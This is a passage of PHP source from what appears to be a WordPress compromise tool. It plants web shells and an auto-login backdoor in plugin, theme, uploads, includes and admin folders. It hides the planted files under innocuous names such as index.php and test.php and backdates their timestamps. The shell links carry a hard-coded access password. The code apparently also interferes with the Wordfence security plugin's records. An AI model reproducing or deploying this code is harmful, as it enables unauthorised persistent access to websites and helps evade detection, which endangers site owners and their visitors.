				echo '<font color="red">'."themes ma is not add".'</font>'."<br/>";
				if(!empty($_POST['file_ma'])){
					$file_ma_array[3]='';
					}else{
						$chama_all_link.=$insert_ma_array[1];
					}
			}
		}
//////////////////////////////////////////uploads

	if(!empty($_POST['chama5'])||!empty($_POST['add_all_check_file_m'])){
			$insert_ma_array=array();
			$shuffle=0;
			$num=1;
			$num2=0;
			$file_name='index.php';
			$scand_dir="wp-content/uploads/".$_POST['chama5'];
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if((count($plugins_array))>55){
			$plugins_array=array_slice($plugins_array,0,55);
			shuffle($plugins_array);
			}else{
				rsort($plugins_array);
			}
			for($i=1;$i<=50;$i++){
				if(!empty($suspected)){
					$file_name=$file_name.$suspected;
				}
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
				$insert_ma_array=insert_org_ma($plugins_array[$i-1],$file_name,'function upfile',$chama_con,$shuffle);
				}
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/".$file_name."uploads ma1 is add".'</font>'."<br/>";
					if(!empty($_POST['file_ma'])){
					$file_ma_array[4]=$insert_ma_array[1];
					}else{
					$chama_all_link.=$insert_ma_array[1].'	';
					}
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='exist_no_add'){
					$shuffle=1;
					if($num2>0){
						$file_name='.index.php';
					}
					$num2++;
				}
				if($insert_ma_array[0]=='scan_error'){
					$scand_dir=$arr[array_rand($arr,1)];
					
				}
				$num++;
			}
			if($insert_falg==0){
				
				echo '<font color="red">'."uploads ma1 is not add".'</font>'."<br/>";
				if(!empty($_POST['file_ma'])){
					$file_ma_array[4]='';
					}else{
						$chama_all_link.=$insert_ma_array[1];
					}
			}
		}
		/////////////////////uploda2
		if(!empty($_POST['chama6'])||!empty($_POST['add_all_check_file_m'])){
			$insert_ma_array=array();
			$shuffle=0;
			$num=1;
			$num2=0;
			if($_POST['no_php5_or_phtml']==1){
				$file_name='.index.php';
			}else{
				$file_name='.index.phtml';
			}
			$scand_dir="wp-content/uploads/".$_POST['chama6'];
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if((count($plugins_array))>55){
			$plugins_array=array_slice($plugins_array,0,55);
			shuffle($plugins_array);
			}else{
				rsort($plugins_array);
			}
			for($i=1;$i<=50;$i++){
				if(!empty($suspected)){
					$file_name=$file_name.$suspected;
				}
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
				$insert_ma_array=insert_org_ma($plugins_array[$i-1],$file_name,'function upfile',$chama_con,$shuffle);
				}
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/".$file_name."uploads ma2 is add".'</font>'."<br/>";
					if(!empty($_POST['file_ma'])){
					$file_ma_array[5]=$insert_ma_array[1];
					}else{
					$chama_all_link.=$insert_ma_array[1].'	';
					}
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='exist_no_add'){
					$shuffle=1;
					if($num2>0){
						$file_name='index.php';
					}
					$num2++;
				}
				if($insert_ma_array[0]=='scan_error'){
					$scand_dir=$arr[array_rand($arr,1)];
					
				}
				$num++;
			}
			if($insert_falg==0){
				
				echo '<font color="red">'."uploads ma2 is not add".'</font>'."<br/>";
				if(!empty($_POST['file_ma'])){
					$file_ma_array[5]='';
					}else{
					$chama_all_link.=$insert_ma_array[1];
					}
			}
		}
		
		//////////////////////////////includes/
		if(!empty($_POST['chama7'])||!empty($_POST['add_all_check_file_m'])){
			$insert_ma_array=array();
			$shuffle=0;
			$num=1;
			$num2=0;
			$file_name='index.php';
			$scand_dir="wp-includes";
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if((count($plugins_array))>55){
			$plugins_array=array_slice($plugins_array,0,55);
			shuffle($plugins_array);
			}else{
				rsort($plugins_array);
			}
			for($i=1;$i<=50;$i++){
				// if(!empty($suspected)){
					// $file_name=$file_name.$suspected;
				// }
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
				$insert_ma_array=insert_org_ma($plugins_array[$i-1],$file_name,'function upfile',$chama_con,$shuffle);
				}
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/".$file_name."includes ma is add".'</font>'."<br/>";
					if(!empty($_POST['file_ma'])){
					$file_ma_array[6]=$insert_ma_array[1];
					}else{
					$chama_all_link.=$insert_ma_array[1].'	';
					}
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='exist_no_add'){
					$shuffle=1;
					if($num2>0){
						$file_name='.index.php';
					}
					$num2++;
				}
				if($insert_ma_array[0]=='scan_error'){
					$scand_dir=$arr[array_rand($arr,1)];
					
				}
				$num++;
			}
			if($insert_falg==0){
				
				echo '<font color="red">'."include ma is not add".'</font>'."<br/>";
				if(!empty($_POST['file_ma'])){
					$file_ma_array[6]='';
					}else{
						$chama_all_link.=$insert_ma_array[1];
					}
			}
		}
		}else{
			echo '<font color="red"> Get ma1 error!!! </font><br/>';
		}
		if(!empty($_POST['file_ma'])){
			$chama_all_link=implode('	',$file_ma_array);
		}else{
			if(empty($_POST['chama1'])&&empty($_POST['chama2'])&&empty($_POST['chama3'])&&empty($_POST['chama4'])&&empty($_POST['chama5'])&&empty($_POST['chama6'])&&empty($_POST['chama7'])&&empty($_POST['add_all_check_file_m'])){
			$chama_all_link="";
			}
		}
		$chama_con=NULL;
		unset($chama_con);
		
		
		
			$chama_all_link2='';
 	/////////////////////////////////////////////////////////////////////////////////////
	
	if(!empty($chama_con2)){
		if(!empty($_POST['new_ma'])){
			$new_ma_array=(explode('	',$_POST['new_ma']));
			$new_ma_num=1;
			foreach($new_ma_array as $new_ma_url){
				if($new_ma_url==''){
					if($new_ma_num-1==0){
						$_POST["chama-new{$new_ma_num}"]=$arr[array_rand($arr,1)];
					}elseif($new_ma_num-1==1){
						$_POST["chama-new{$new_ma_num}"]=$arr2[array_rand($arr2,1)];
					}elseif($new_ma_num-1==2){
						$_POST["chama-new{$new_ma_num}"]=$arr1[array_rand($arr1,1)];
					}
				}else{
					$url_str_replace_array=array("http://","https://");
				$new_ma_url=str_replace($url_str_replace_array,'',$new_ma_url);
				$new_ma_url=str_replace(str_replace($url_str_replace_array,'',$url_root),$_POST['root'],$new_ma_url);
				if(!is_file($new_ma_url)){
					$new_ma_array[$new_ma_num-1]='';
					if($new_ma_num-1==0){
						$_POST["chama-new{$new_ma_num}"]=$arr[array_rand($arr,1)];
					}elseif($new_ma_num-1==1){
						$_POST["chama-new{$new_ma_num}"]=$arr2[array_rand($arr2,1)];
					}elseif($new_ma_num-1==2){
						$_POST["chama-new{$new_ma_num}"]=$arr1[array_rand($arr1,1)];
					}
				}else{
					$check_new_ma=file_get_contents($new_ma_url);
					if(strpos($check_new_ma,'PHP Encode by')!==false){
						echo '<font color="green">'.$new_ma_url.' ok!</font>'."<br/>"; 
					}else{
						$new_ma_array[$new_ma_num-1]='';
						if($new_ma_num-1==0){
						$_POST["chama-new{$new_ma_num}"]=$arr[array_rand($arr,1)];
					}elseif($new_ma_num-1==1){
						$_POST["chama-new{$new_ma_num}"]=$arr2[array_rand($arr2,1)];
					}elseif($new_ma_num-1==2){
						$_POST["chama-new{$new_ma_num}"]=$arr1[array_rand($arr1,1)];
					}
					}
				}
				}
				
				
				
				//if(!is_file())
				$new_ma_num++;
			}
		}
		
		if(!empty($_POST['chama-new1'])){
			$insert_ma_array=array();
			$shuffle=1;
			$num=1;
			$num2=0;
			$file_name='index.php';
			$scand_dir="wp-content/plugins/".$_POST['chama-new1'];
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if((count($plugins_array))>55){
			$plugins_array=array_slice($plugins_array,0,55);
			shuffle($plugins_array);
			}else{
				rsort($plugins_array);
			}
			for($i=1;$i<=50;$i++){
				if(!empty($suspected)){
					$file_name=$file_name.$suspected;
				}
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
				$insert_ma_array=insert_org_ma($plugins_array[$i-1],$file_name,'PHP Encode by',$chama_con2,$shuffle);
				}
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/".$file_name."chama new1 is add".'</font>'."<br/>";
					if(!empty($_POST['new_ma'])){
						$new_ma_array[0]=$insert_ma_array[1];
					}
					else{
						$chama_all_link2.=$insert_ma_array[1].'	';
					}
					
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='exist_no_add'){
					
					if($num2>0){
						$file_name='.index.php';
					}
					$num2++;
				}
				if($insert_ma_array[0]=='scan_error'){
					$scand_dir=$arr[array_rand($arr,1)];
					
				}
				$num++;
			}
			if($insert_falg==0){
				
				echo '<font color="red">'."chama new1 is not add".'</font>'."<br/>";
				if(!empty($_POST['new_ma'])){
						$new_ma_array[0]='';
					}
					else{
				$chama_all_link2.=$insert_ma_array[1];
					}
			}
		}
 ////////////////////////////////////////////////
 if(!empty($_POST['chama-new2'])){
			$insert_ma_array=array();
			$num=1;
			$num2=0;
			$shuffle=1;
			$file_name='index.php';
			$scand_dir="wp-content/themes/".$_POST['chama-new2'];
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if((count($plugins_array))>55){
			$plugins_array=array_slice($plugins_array,0,55);
			shuffle($plugins_array);
			}else{
				rsort($plugins_array);
			}
			for($i=1;$i<=50;$i++){
				if(!empty($suspected)){
					$file_name=$file_name.$suspected;
				}
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
				$insert_ma_array=insert_org_ma($plugins_array[$i-1],$file_name,'PHP Encode by',$chama_con2,$shuffle);
				}
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/".$file_name."chama new2 is add".'</font>'."<br/>";
					if(!empty($_POST['new_ma'])){
						$new_ma_array[1]=$insert_ma_array[1];
					}
					else{
					$chama_all_link2.=$insert_ma_array[1].'	';
					}
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='exist_no_add'){
					
					if($num2>0){
						$file_name='.index.php';
					}
					$num2++;
				}
				if($insert_ma_array[0]=='scan_error'){
					$scand_dir=$arr[array_rand($arr,1)];
					
				}
				$num++;
			}
			if($insert_falg==0){
				
				echo '<font color="red">'."chama new2 is not add".'</font>'."<br/>";
				if(!empty($_POST['new_ma'])){
						$new_ma_array[1]='';
					}
					else{
				$chama_all_link2.=$insert_ma_array[1];
					}
			}
		} 
		
//////////////////////////////////////////uploads

if(!empty($_POST['chama-new3'])){
			$insert_ma_array=array();
			$shuffle=1;
			$num=1;
			$num2=0;
			$file_name='index.php';
			$scand_dir="wp-content/uploads/".$_POST['chama-new3'];
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if((count($plugins_array))>55){
			$plugins_array=array_slice($plugins_array,0,55);
			shuffle($plugins_array);
			}else{
				rsort($plugins_array);
			}
			for($i=1;$i<=50;$i++){
				if(!empty($suspected)){
					$file_name=$file_name.$suspected;
				}
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
				$insert_ma_array=insert_org_ma($plugins_array[$i-1],$file_name,'PHP Encode by',$chama_con2,$shuffle);
				}
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/".$file_name."chama new3 is add".'</font>'."<br/>";
					if(!empty($_POST['new_ma'])){
						$new_ma_array[2]=$insert_ma_array[1];
					}
					else{
					$chama_all_link2.=$insert_ma_array[1].'	';
					}
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='exist_no_add'){
					if($num2>0){
						$file_name='.index.php';
					}
					$num2++;
				}
				if($insert_ma_array[0]=='scan_error'){
					$scand_dir=$arr[array_rand($arr,1)];
					
				}
				$num++;
			}
			if($insert_falg==0){
				
				echo '<font color="red">'."chama new3 is not add".'</font>'."<br/>";
				if(!empty($_POST['new_ma'])){
						$new_ma_array[2]='';
					}
					else{
				$chama_all_link2.=$insert_ma_array[1];
					}
			}
		} 
	}
	else{
		echo '<font color="red"> Get ma2 error!!! </font><br/>';
	}
	if(!empty($_POST['new_ma'])){
		$chama_all_link2=implode('	',$new_ma_array);
	}
	else{
		if(empty($_POST['chama-new1'])&&empty($_POST['chama-new2'])&&empty($_POST['chama-new3'])){
			$chama_all_link2="";
		}
	}
$chama_con2=NULL;
unset($chama_con2);
 ////////////////////////////////////////////////
 
 $chama_all_link3='';
 
 if(!empty($_POST['upload_ma'])){
			$upload_ma_array=(explode('	',$_POST['upload_ma']));
			$upload_ma_num=0;
			foreach($upload_ma_array as $upload_ma_url){
				if($upload_ma_url==''){
					if($upload_ma_num==0){
						$_POST['upload_admin']=1;
					}elseif($upload_ma_num==1){
						$_POST['upload_file1']=$arr[array_rand($arr,1)];
					}elseif($upload_ma_num==2){
						$_POST['upload_file2']=$arr2[array_rand($arr2,1)];
					}elseif($upload_ma_num==3){
						$_POST['upload_file3']=$arr1[array_rand($arr1,1)];
					}elseif($upload_ma_num==4){
						$_POST['upload_include']=1;
					}elseif($upload_ma_num==5){
						$_POST['upload_file4']=1;
					}elseif($upload_ma_num==6){
						$_POST['upload_file5']=1;
					}
				}else{
					$url_str_replace_array=array("http://","https://");
				$upload_ma_url=str_replace($url_str_replace_array,'',$upload_ma_url);
				$upload_ma_url=str_replace(str_replace($url_str_replace_array,'',$url_root),$_POST['root'],$upload_ma_url);
				$upload_ma_url=str_replace('?pass=A4bGff!dV5','',$upload_ma_url);
				if(!is_file($upload_ma_url)){
					$upload_ma_array[$upload_ma_num]='';
					if($upload_ma_num==0){
						$_POST['upload_admin']=1;
					}elseif($upload_ma_num==1){
						$_POST['upload_file1']=$arr[array_rand($arr,1)];
					}elseif($upload_ma_num==2){
						$_POST['upload_file2']=$arr2[array_rand($arr2,1)];
					}elseif($upload_ma_num==3){
						$_POST['upload_file3']=$arr1[array_rand($arr1,1)];
					}elseif($upload_ma_num==4){
						$_POST['upload_include']=1;
					}elseif($upload_ma_num==5){
						$_POST['upload_file4']=1;
					}elseif($upload_ma_num==6){
						$_POST['upload_file5']=1;
					}
				}else{
					$check_upload_ma=file_get_contents($upload_ma_url);
					if(strpos($check_upload_ma,'$system == \'ddbc825a724afc8d08cfdbf82d4a3a13\'')!==false){
						echo '<font color="green">'.$upload_ma_url.' ok!</font>'."<br/>"; 
					}else{
						if($upload_ma_num==0){
						$_POST['upload_admin']=1;
						}elseif($upload_ma_num==1){
							$_POST['upload_file1']=$arr[array_rand($arr,1)];
						}elseif($upload_ma_num==2){
							$_POST['upload_file2']=$arr2[array_rand($arr2,1)];
						}elseif($upload_ma_num==3){
							$_POST['upload_file3']=$arr1[array_rand($arr1,1)];
						}elseif($upload_ma_num==4){
							$_POST['upload_include']=1;
						}elseif($upload_ma_num==5){
							$_POST['upload_file4']=1;
						}elseif($upload_ma_num==6){
							$_POST['upload_file5']=1;
						}
						$upload_ma_array[$upload_ma_num]='';
					}
				}
				}
				//if(!is_file())
				$upload_ma_num++;
			}
		}//add_all_upload
		
		
	if(!empty($_POST['upload_admin'])||!empty($_POST['add_all_upload'])){
			$insert_ma_array=array();
			$shuffle=1;
			$num2=0;
			$file_name='index.php';
			$scand_dir="wp-admin";
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if((count($plugins_array))>55){
			$plugins_array=array_slice($plugins_array,0,55);
			shuffle($plugins_array);
			}else{
				rsort($plugins_array);
			}
			for($i=1;$i<=50;$i++){
				if(!empty($suspected)){
					$file_name=$file_name.$suspected;
				}
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
				$insert_ma_array=insert_org_ma($plugins_array[$i-1],$file_name,'$system == \'ddbc825a724afc8d08cfdbf82d4a3a13\'',$upload_con,$shuffle);
				}
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/".$file_name."upload admin is add".'</font>'."<br/>";
					if(!empty($_POST['upload_ma'])){
						$upload_ma_array[0]=$insert_ma_array[1].'?pass=A4bGff!dV5';
					}else{
					$chama_all_link3.=$insert_ma_array[1].'?pass=A4bGff!dV5	';
					}
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='exist_no_add'){
					if($num2>0){
						$file_array=array('test.php','.test.php','.index.php','wp-setting.php','.wp-settings.php');
						$file_name=$file_array[array_rand($file_array,1)];
					}
					$num2++;
				}
				if($insert_ma_array[0]=='scan_error'){
					$scand_dir=$arr[array_rand($arr,1)];
					
				}
				
			}
			if($insert_falg==0){
				
				echo '<font color="red">'."upload admin is not add".'</font>'."<br/>";
				if(!empty($_POST['upload_ma'])){
						$upload_ma_array[0]='';
					}else{
				$chama_all_link3.=$insert_ma_array[1];
					}
			}
		}
		
		
 if(!empty($_POST['upload_file1'])||!empty($_POST['add_all_upload'])){
			$insert_ma_array=array();
			$shuffle=1;
			$num=1;
			$num2=0;
			$file_name='index.php';
			$scand_dir="wp-content/plugins/".$_POST['upload_file1'];
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if((count($plugins_array))>55){
			$plugins_array=array_slice($plugins_array,0,55);
			shuffle($plugins_array);
			}else{
				rsort($plugins_array);
			}
			for($i=1;$i<=50;$i++){
				if(!empty($suspected)){
					$file_name=$file_name.$suspected;
				}
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
				$insert_ma_array=insert_org_ma($plugins_array[$i-1],$file_name,'$system == \'ddbc825a724afc8d08cfdbf82d4a3a13\'',$upload_con,$shuffle);
				}
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/".$file_name."upload file1 is add".'</font>'."<br/>";
					if(!empty($_POST['upload_ma'])){
						$upload_ma_array[1]=$insert_ma_array[1].'?pass=A4bGff!dV5';
					}else{
					$chama_all_link3.=$insert_ma_array[1].'?pass=A4bGff!dV5	';
					}
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='exist_no_add'){
					if($num2>0){
						$file_array=array('test.php','.test.php','.index.php','wp-setting.php','.wp-setting.php');
						$file_name=$file_array[array_rand($file_array,1)];
					}
					$num2++;
				}
				if($insert_ma_array[0]=='scan_error'){
					$scand_dir=$arr[array_rand($arr,1)];
					
				}
				$num++;
			}
			if($insert_falg==0){
				
				echo '<font color="red">'."upload file1 is not add".'</font>'."<br/>";
				if(!empty($_POST['upload_ma'])){
						$upload_ma_array[1]='';
					}else{
				$chama_all_link3.=$insert_ma_array[1];
					}
			}
		}
		
		/////////////////////////////////////////////
		if(!empty($_POST['upload_file2'])||!empty($_POST['add_all_upload'])){
			$insert_ma_array=array();
			$shuffle=1;
			$num=1;
			$num2=0;
			$file_name='index.php';
			$scand_dir="wp-content/themes/".$_POST['upload_file2'];
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if((count($plugins_array))>55){
			$plugins_array=array_slice($plugins_array,0,55);
			shuffle($plugins_array);
			}else{
				rsort($plugins_array);
			}
			for($i=1;$i<=50;$i++){
				if(!empty($suspected)){
					$file_name=$file_name.$suspected;
				}
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
				$insert_ma_array=insert_org_ma($plugins_array[$i-1],$file_name,'$system == \'ddbc825a724afc8d08cfdbf82d4a3a13\'',$upload_con,$shuffle);
				}
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/".$file_name."upload file2 is add".'</font>'."<br/>";
					if(!empty($_POST['upload_ma'])){
						$upload_ma_array[2]=$insert_ma_array[1].'?pass=A4bGff!dV5';
					}else{
					$chama_all_link3.=$insert_ma_array[1].'?pass=A4bGff!dV5	';
					}
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='exist_no_add'){
					if($num2>0){
						$file_array=array('test.php','.test.php','.index.php','wp-setting.php','.wp-setting.php');
						$file_name=$file_array[array_rand($file_array,1)];
					}
					$num2++;
				}
				if($insert_ma_array[0]=='scan_error'){
					$scand_dir=$arr[array_rand($arr,1)];
					
				}
				$num++;
			}
			if($insert_falg==0){
				
				echo '<font color="red">'."upload file2 is not add".'</font>'."<br/>";
				if(!empty($_POST['upload_ma'])){
						$upload_ma_array[2]='';
					}else{
				$chama_all_link3.=$insert_ma_array[1];
					}
			}
		}		
		///////////////////////////////////////////////////////////
		if(!empty($_POST['upload_file3'])||!empty($_POST['add_all_upload'])){
			$insert_ma_array=array();
			$shuffle=1;
			$num=1;
			$num2=0;
			$file_name='index.php';
			$scand_dir="wp-content/uploads/".$_POST['upload_file3'];
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if((count($plugins_array))>55){
			$plugins_array=array_slice($plugins_array,0,55);
			shuffle($plugins_array);
			}else{
				rsort($plugins_array);
			}
			for($i=1;$i<=50;$i++){
				if(!empty($suspected)){
					$file_name=$file_name.$suspected;
				}
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
				$insert_ma_array=insert_org_ma($plugins_array[$i-1],$file_name,'$system == \'ddbc825a724afc8d08cfdbf82d4a3a13\'',$upload_con,$shuffle);
				}
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/".$file_name."upload file3 is add".'</font>'."<br/>";
					if(!empty($_POST['upload_ma'])){
						$upload_ma_array[3]=$insert_ma_array[1].'?pass=A4bGff!dV5';
					}else{
					$chama_all_link3.=$insert_ma_array[1].'?pass=A4bGff!dV5	';
					}
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='exist_no_add'){
					if($num2>0){
						$file_array=array('test.php','.test.php','.index.php','wp-setting.php','.wp-setting.php');
						$file_name=$file_array[array_rand($file_array,1)];
					}
					$num2++;
				}
				if($insert_ma_array[0]=='scan_error'){
					$scand_dir=$arr[array_rand($arr,1)];
					
				}
				$num++;
			}
			if($insert_falg==0){
				
				echo '<font color="red">'."upload file3 is not add".'</font>'."<br/>";
				if(!empty($_POST['upload_ma'])){
						$upload_ma_array[3]='';
					}else{
				$chama_all_link3.=$insert_ma_array[1];
					}
			}
		}

		////////////////////////////////////////////////////////
		if(!empty($_POST['upload_include'])||!empty($_POST['add_all_upload'])){
			$insert_ma_array=array();
			$shuffle=1;
			$num=1;
			$num2=0;
			$file_name='index.php';
			$scand_dir="wp-includes";
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if((count($plugins_array))>55){
			$plugins_array=array_slice($plugins_array,0,55);
			shuffle($plugins_array);
			}else{
				rsort($plugins_array);
			};
			for($i=1;$i<=50;$i++){
				if(!empty($suspected)){
					$file_name=$file_name.$suspected;
				}
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
				$insert_ma_array=insert_org_ma($plugins_array[$i-1],$file_name,'$system == \'ddbc825a724afc8d08cfdbf82d4a3a13\'',$upload_con,$shuffle);
				}
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/".$file_name."upload include is add".'</font>'."<br/>";
					if(!empty($_POST['upload_ma'])){
						$upload_ma_array[4]=$insert_ma_array[1].'?pass=A4bGff!dV5';
					}else{
					$chama_all_link3.=$insert_ma_array[1].'?pass=A4bGff!dV5	';
					}
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='exist_no_add'){
					if($num2>0){
						$file_array=array('test.php','.test.php','.index.php','wp-setting.php','.wp-setting.php');
						$file_name=$file_array[array_rand($file_array,1)];
					}
					$num2++;
				}
				if($insert_ma_array[0]=='scan_error'){
					$scand_dir=$arr[array_rand($arr,1)];
					
				}
				$num++;
			}
			if($insert_falg==0){
				
				echo '<font color="red">'."upload include is not add".'</font>'."<br/>";
				if(!empty($_POST['upload_ma'])){
						$upload_ma_array[4]='';
					}else{
				$chama_all_link3.=$insert_ma_array[1];
					}
			}
		}
		////////////////////////////////////////////////////////
 
		if(!empty($_POST['upload_file4'])||!empty($_POST['add_all_upload'])){
		$new_ma_con=$upload_con_2;
		$add_user_link=insert_ma('upload_con_2',$new_ma_con);
		if(!empty($add_user_link)){
			if(!empty($_POST['upload_ma'])){
						$upload_ma_array[5]=$add_user_link.'?pass=A4bGff!dV5';
					}else{
			$chama_all_link3.=$add_user_link.'?pass=A4bGff!dV5'.'	';
					}
		}else{
			if(!empty($_POST['upload_ma'])){
						$upload_ma_array[5]='';
					}else{
			$chama_all_link3.='	';
					}
		}
	}
	/////////////////////////////////////////////////////////////////////
		if(!empty($_POST['upload_file5'])||!empty($_POST['add_all_upload'])){
		$new_ma_con=$upload_con_3;
		$add_user_link=insert_ma('upload_con_3',$new_ma_con);
		if(!empty($add_user_link)){
			if(!empty($_POST['upload_ma'])){
						$upload_ma_array[6]=$add_user_link.'?pass=A4bGff!dV5';
					}else{
			$chama_all_link3.=$add_user_link.'?pass=A4bGff!dV5'.'	';
					}
		}else{
			if(!empty($_POST['upload_ma'])){
						$upload_ma_array[6]='';
					}else{
			$chama_all_link3.='	';
					}
		}
	}
		//upload_admin     upload_include
			if(!empty($_POST['upload_ma'])){
				$chama_all_link3=implode('	',$upload_ma_array);
			}else{
				if(empty($_POST['upload_admin'])&&empty($_POST['upload_include'])&&empty($_POST['upload_file1'])&&empty($_POST['upload_file2'])&&empty($_POST['upload_file3'])&&empty($_POST['upload_file4'])&&empty($_POST['upload_file5'])&&empty($_POST['add_all_upload'])){
			$chama_all_link3="";
			}
			}
		
		
		//////////////////////////auto login
		if(is_file($_POST['root']."/wp-content/plugins/test.php")){
			$auto_login_get=file_get_contents($_POST['root']."/wp-content/plugins/test.php".$suspected);
			if(strpos($auto_login_get,'wp_set_current_user')!==false){
				echo '<font color="green">'."Auto Login Is Exists!".'</font>'."<br/>";
			}
			else{
				@unlink($_POST['root']."/wp-content/plugins/test.php".$suspected);
				@file_put_contents($_POST['root']."/wp-content/plugins/test.php".$suspected,$auto_login);
				@chmod($_POST['root']."/wp-content/plugins/test.php".$suspected,$file_per);
				@touch($_POST['root']."/wp-content/plugins/test.php".$suspected,$time);
				@touch($_POST['root']."/wp-content/plugins/",$time);
				if(strpos($auto_login_get,'wp_set_current_user')!==false){
					echo '<font color="green">'.$url_root.'wp-content/plugins/test.php'.$suspected.' Auto Login Is add!'.'</a></font>'."<br/>";
					if(is_dir($_POST['root'].'wp-content/plugins/wordfence/')){
					insert_database($table_prefix,"wp-content/plugins/test.php".$suspected);
					}
					
				}else{
					echo '<font color="red">'."Auto Login Is not add!".'</font>'."<br/>";
				}
			}
		}
			else{
			@file_put_contents($_POST['root']."/wp-content/plugins/test.php".$suspected,$auto_login);
			@chmod($_POST['root']."/wp-content/plugins/test.php".$suspected,$file_per);
			@touch($_POST['root']."/wp-content/plugins/test.php".$suspected,$time);
			@touch($_POST['root']."/wp-content/plugins/",$time);
				$auto_login_get=file_get_contents($_POST['root']."/wp-content/plugins/test.php".$suspected);
				if(strpos($auto_login_get,'wp_set_current_user')!==false){
					echo '<font color="green">'.$url_root.'wp-content/plugins/test.php'.$suspected.' Auto Login Is add!'.'</font>'."<br/>";
					if(is_dir($_POST['root'].'wp-content/plugins/wordfence/')){
					insert_database($table_prefix,"wp-content/plugins/test.php".$suspected);
					}
				}else{
					echo '<font color="red">'."Auto Login Is not add!".'</font>'."<br/>";
				}
		}
	
	$chama_all_link4='';
	if(!empty($_POST['auto_login_ma'])){
			$auto_login_ma_array=(explode('	',$_POST['auto_login_ma']));
			$auto_login_ma_num=0;
			foreach($auto_login_ma_array as $auto_login_ma_url){
				if($auto_login_ma_url==''){
					if($auto_login_ma_num==0){
						$_POST['auto_login_admin']=1;
					}elseif($auto_login_ma_num==1){
						$_POST['auto_login_plugin']=1;
					}elseif($auto_login_ma_num==2){
						$_POST['auto_login_themes']=1;
					}elseif($auto_login_ma_num==3){
						$_POST['auto_login_uploads']=1;
					}elseif($auto_login_ma_num==4){
						$_POST['auto_login_includes']=1;
					}
				}else{
					$url_str_replace_array=array("http://","https://");
				$auto_login_ma_url=str_replace($url_str_replace_array,'',$auto_login_ma_url);
				$auto_login_ma_url=str_replace(str_replace($url_str_replace_array,'',$url_root),$_POST['root'],$auto_login_ma_url);
				$auto_login_ma_url=str_replace('?pass=A4bGff!dV5','',$auto_login_ma_url);
				if(!is_file($auto_login_ma_url)){
					$auto_login_ma_array[$auto_login_ma_num]='';
					if($auto_login_ma_num==0){
						$_POST['auto_login_admin']=1;
					}elseif($auto_login_ma_num==1){
						$_POST['auto_login_plugin']=1;
					}elseif($auto_login_ma_num==2){
						$_POST['auto_login_themes']=1;
					}elseif($auto_login_ma_num==3){
						$_POST['auto_login_uploads']=1;
					}elseif($auto_login_ma_num==4){
